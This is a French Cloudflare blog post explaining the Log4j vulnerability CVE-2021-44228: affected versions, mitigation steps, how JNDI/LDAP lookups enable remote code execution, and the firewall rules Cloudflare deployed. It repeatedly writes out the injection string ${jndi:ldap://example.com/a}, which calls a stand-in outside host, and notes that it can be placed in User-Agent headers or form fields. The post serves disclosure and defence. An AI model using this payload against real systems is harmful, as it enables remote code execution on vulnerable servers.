<div class="post-content lh-copy gray1">
	<p><em>Dans les versions précédentes de cette publication de blog, des techniques d’atténuation légèrement différentes étaient recommandées. Le projet Apache Log4j a mis à jour ses directives officielles, et nous avons mis à jour cette publication de blog conformément à ses recommandations.</em></p>
	<p>Aujourd'hui, 9 décembre 2021, une très grave vulnérabilité concernant l'utilitaire de journalisation Java <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228" target="_blank">Log4j</a> a été révélée. Cette vulnérabilité permet aux attaquants d'exécuter du code sur un serveur à distance ; ce qu'on appelle une injection de code ou exécution de code à distance (RCE pour l'anglais Remote Code Execution). Le recours à Java et Log4j étant devenu quasiment généralisé, il est probable qu'il s'agisse d'une des plus graves vulnérabilités touchant Internet depuis <a href="https://blog.cloudflare.com/tag/heartbleed/">Heartbleed</a> et <a href="https://blog.cloudflare.com/inside-shellshock/">ShellShock</a>.</p>
	<p>Il s’agit de la faille <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228" target="_blank">CVE-2021-44228</a>, et elle concerne la version 2 de Log4j, entre les versions 2.0-beta-9 et 2.14.1. Elle fait l’objet d’un correctif dans la version 2.16.0.</p>
	<p>Dans cet article, nous expliquons l'historique de cette vulnérabilité, la manière dont elle a été introduite, la façon dont Cloudflare protège nos clients. <a href="https://blog.cloudflare.com/fr-fr/actual-cve-2021-44228-payloads-captured-in-the-wild-fr-fr/">Le détail des tentatives d'exploitation</a> dont nous avons observé qu'elles étaient bloquées par notre service de pare-feu figure dans un article de blog distinct.</p>
	<p>Cloudflare utilise du logiciel Java et nos équipes ont fait en sorte que nos systèmes ne soient pas vulnérables devant cette faille ou que cette vulnérabilité puisse être atténuée. Parallèlement, nous avons déployé des règles de pare-feu destinées à protéger nos clients.</p>
	<p>Toutefois, si vous travaillez pour une entreprise utilisant du logiciel Java faisant intervenir Log4j, il serait judicieux de lire immédiatement la section concernant la manière d'atténuer et de protéger vos systèmes avant de lire le reste.</p>
	<h3 id="comment-att-nuer-la-faille-cve-2021-44228"><strong>Comment atténuer la faille CVE-2021-44228</strong></h3>
	<p>Appliquez l’une des techniques d’atténuation suivantes : les utilisateurs de Java 8 (ou version ultérieure) doivent installer la version 2.16.0. Les utilisateurs de Java 7 doivent installer la version 2.12.2.</p>
	<p>Par ailleurs, dans toute version autre que 2.16.0, vous pouvez supprimer la classe JndiLookup du chemin de classe : <code>zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class</code></p>
	<h3 id="historique-de-la-vuln-rabilit-"><strong>Historique de la vulnérabilité</strong></h3>
	<p>En 2013, dans la <a href="https://blogs.apache.org/logging/entry/apache_log4j_2_0_beta9" target="_blank">version 2.0-beta9</a>, l'utilitaire Log4j a ajouté le module d'extension JNDILookup en lançant <a href="https://issues.apache.org/jira/browse/LOG4J2-313" target="_blank">LOG4J2-313</a>. Pour comprendre en quoi cette modification a pu créer un problème, il est nécessaire d'en savoir un peu plus sur <a href="https://en.wikipedia.org/wiki/Java_Naming_and_Directory_Interface" target="_blank">JNDI</a> : Java Naming and Directory Interface.</p>
	<p>JNDI existe dans Java depuis 1990. Il s'agit d'un service d'annuaire qui permet à un programme Java de chercher des données (sous la forme d'un objet Java) dans un annuaire. JNDI compte un certain nombre d'interfaces de prestation de service (SPI) qui lui permettent d'utiliser divers services d'annuaire.</p>
	<p>Par exemple, il existe des SPI pour CORBA COS (Common Object Service), le registre Java RMI (Remote Method Interface) et LDAP. LDAP (Lightweight Directory Access Protocol) est un service d'annuaire très populaire et il est le premier concerné par CVE-2021-44228 (même si d'autres SPI le sont potentiellement aussi).</p>
	<p>Un programme Java peut utiliser JNDI et LDAP ensemble pour chercher un objet Java contenant les données dont il a éventuellement besoin. Par exemple, dans la documentation Java standard, un <a href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/examples/directory.html" target="_blank">exemple</a> s'adresse à un serveur LDAP pour récupérer les attributs d'un objet. Il utilise l'URL <code>ldap://localhost:389/o=JNDITutorial</code> pour trouver l'objet JNDITutorial auprès d'un serveur LDAP exécuté sur la même machine (localhost) sur le port 389 et il s'en sert pour y lire les attributs.</p>
	<p>Comme l'indique le tutoriel « <em>Si votre serveur LDAP se trouve sur une autre machine ou s'il utilise un autre port, vous devez modifier l'URL LDAP</em> ». Le serveur LDAP peut donc tourner sur une machine différente et potentiellement n'importe où sur Internet. Cette souplesse signifie que si un attaquant peut contrôler l'URL LDAP, il est en mesure de demander à un programme Java de charger un objet depuis un serveur dont il a le contrôle.</p>
	<p>Ce sont les principes de base de JNDI et LDPA ; un élément utile de l'écosystème Java.</p>
	<p>Mais dans le cas de Log4j, un attaquant peut contrôler l'URL LDAP pour essayer d'écrire une chaîne telle que <code>${jndi:ldap://example.com/a}</code>. S'il y parvient, Log4j se connecte au serveur LDAP sur exemple.com et récupère l'objet.</p>
	<p>Une telle situation est possible car Log4j comporte <a href="https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution" target="_blank">une syntaxe particulière</a> qui se présente comme suit, ${prefix:name} dans laquelle prefix est un des nombreux différents <a href="https://logging.apache.org/log4j/2.x/manual/lookups.html" target="_blank">Lookups</a>, et name doit prendre une valeur. Par exemple, ${java:version} est la version de Java en cours d'exécution.</p>
	<p><a href="https://issues.apache.org/jira/browse/LOG4J2-313" target="_blank">LOG4J2-313</a> a ajouté un Lookup jndi qui se présente ainsi : « Le JndiLookup permet de récupérer des variables via JNDI. Par défaut, la clé aura comme préfixe java:comp/env/, toutefois, si la clé contient un « : » aucun préfixe ne sera ajouté. »</p>
	<p>Avec un : dans la clé, comme dans <code>${jndi:ldap://example.com/a}</code>, il n'y a aucun préfixe et une requête pour l'objet est adressée au serveur LDAP. Ces Lookups peuvent être utilisés dans les deux configurations du Log4j ainsi que lorsque les lignes sont journalisées.</p>
	<p>Ainsi, il suffit à un attaquant de chercher des données qui sont journalisées et d'ajouter quelque chose comme <code>${jndi:ldap://example.com/a}</code>. Il peut s'agir d'un en-tête HTTP courant tel que User-Agent (qui est couramment journalisé) ou encore d'un paramètre de formulaire tel que username, susceptible d'être journalisé.</p>
	<p>C'est généralement très courant dans le cadre d'un logiciel Internet Java ayant recours à Log4j. Le risque le plus insidieux réside dans le fait que les logiciels qui ne sont pas utilisés sur Internet mais qui ont recours à Java peuvent également être exploités dans la mesure où les données sont transmises d'un système à l'autre.</p>
	<p>Par exemple, une chaîne User-Agent contenant l'exploitation peut être transmise à un système backend écrit en code Java qui pratique l'indexation ou la science des données et l'exploitation peut être journalisée. C'est pourquoi il est essentiel que le logiciel Java qui utilise la version de Log4j bénéficie d'un correctif ou d'atténuations au plus vite. Même si le logiciel utilisé sur Internet n'est pas écrit en code Java, il est possible que ces chaînes soient transmises à d'autres systèmes en code Java, ce qui rend l'exploitation possible.</p>
	<figure class="kg-card kg-image-card kg-width-wide"><img src="https://blog.cloudflare.com/content/images/2021/12/Exploit-activated-6.png" class="kg-image" alt="Even if the Internet-facing software is not written in Java it is possible that strings get passed to other systems that are in Java allowing the exploit to happen."></figure>
	<p>Autrement, imaginons un système de facturation Java qui enregistre les instances lorsque le prénom du client n'est pas trouvé. Un utilisateur malveillant peut créer une commande avec un prénom contenant l'exploitation et de multiples sauts (et beaucoup de temps) peuvent être nécessaires pour arriver au serveur web, par le biais d'une base de données client, jusqu'au système de facturation où l'exploitation sera enfin exécutée.</p>
	<p>Et Java est utilisé pour beaucoup plus de systèmes, pas uniquement ceux qui sont sur Internet. Par exemple, il n'est pas difficile d'imaginer un système de manipulation de colis qui lit les codes QR sur des boîtes ou un ouvre-porte sans contact, les deux sont vulnérables car ils sont écrits en code Java et utilisent Log4j. Dans un cas, un code QR soigneusement conçu peut contenir une adresse postale qui comporte la chaîne d'exploitation ; dans l'autre un ouvre-porte minutieusement programmé peut comporter l'exploitation et être journalisé par un système de suivi des entrées et sorties.</p>
	<p>Et il y a des risques que les systèmes qui fonctionnent périodiquement finissent par capturer l'exploitation et la journaliser même plus tard. L'exploitation peut donc rester en sommeil jusqu'à ce qu'une procédure d'indexation, de report ou d'archivage écrite en code java journalise par inadvertance la chaîne erronée. Des heures ou des jours plus tard.</p>
	<h3 id="protection-par-pare-feu-cloudflare"><strong>Protection par pare-feu Cloudflare</strong></h3>
	<p>Cloudflare a déployé une protection pour nos clients à l'aide de notre pare-feu sous la forme de règles qui bloquent le Lookup jndi à des emplacements courants dans une requête HTTP. Vous en trouverez le détail <a href="https://blog.cloudflare.com/fr-fr/cve-2021-44228-log4j-rce-0-day-mitigation-fr-fr/">ici</a>. Nous avons continué à peaufiner ces règles à mesure que les attaquants modifiaient leurs exploitations et nous poursuivrons ainsi.</p>
</div>